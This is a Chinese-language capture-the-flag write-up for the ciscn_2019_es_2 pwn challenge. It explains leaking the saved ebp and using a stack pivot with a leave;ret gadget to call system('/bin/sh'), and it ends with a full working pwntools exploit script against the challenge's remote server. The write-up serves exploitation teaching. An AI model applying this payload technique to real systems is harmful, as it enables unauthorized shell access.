首先checksec

![image-20201124163733385](https://static.hack1s.fun/images/2021/02/06/image-20201124163733385.png)

开启了nx的32位程序

程序存在漏洞的代码

![image-20201124163754539](https://static.hack1s.fun/images/2021/02/06/image-20201124163754539.png)

read溢出了0x8个字节，也就是只能控制esp和ra

一共触发了两次，另外还有printf函数直接以字符串形式输出

函数表中还存在一个hack函数

![image-20201124164041962](https://static.hack1s.fun/images/2021/02/06/image-20201124164041962.png)

这个函数其实只能输出'flag'这个字符串，并没办法输出里面的内容，这个的作用应该就是提供system函数

由于这里调用了两次这个read，我们可以尝试将esp迁移到s的位置，这样第二次输入的内容就可以直接当做栈上需要的参数

第一次输入需要正好覆盖28h，这样让程序可以输出爆存在栈上的old-ebp的值，然后动态调试找到old-ebp和s之间的偏移



首先第一次的read，输入内容正好28h，让printf输出将要覆盖的ebp的值

![image-20201124183926382](https://static.hack1s.fun/images/2021/02/06/image-20201124183926382.png)

动态调试时可以看到泄漏的地址值为`0xffbb96f8`

而实际上我们控制的缓冲区s的地址是`0xffbb96c0`，两者之间相差了`0x38`，而根据我们shellcode的组织，`/bin/sh`字符串位于`0x28`的偏移处



之后第二次的溢出，就是构造出栈迁移到s缓冲区上

```python
payload = "aaaa" + p32(elf.sym['system']) + p32(elf.sym['vul']) + p32(old_ebp - 0x28) + "/bin/sh\x00"
```

除了这一段的内容以外还需要将这个长度填充到28h

之后的ebp和return address就填写栈迁移时用到的值，分别是s的起始地址和`leave;ret`的地址

找到这样的gadget地址

![image-20201124170421411](https://static.hack1s.fun/images/2021/02/06/image-20201124170421411.png)

最终的脚本

```python
from pwn import *

io = remote('node3.buuoj.cn',26407)
#io = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2')

leave_ret = 0x80484b8

payload1 = 'a'*0x20 + 'b'*8

io.send(payload1)

io.recvuntil('bbbbbbbb')
old_ebp = u32(io.recv(4))

payload2 = b'aaaa' + p32(elf.sym['system']) + p32(elf.sym['vul']) + p32(old_ebp-0x28)+b"/bin/sh\x00"
payload2 += (0x28-len(payload2))*b'c'
payload2 += p32(old_ebp-0x38) + p32(leave_ret)

io.send(payload2)
io.interactive()
```

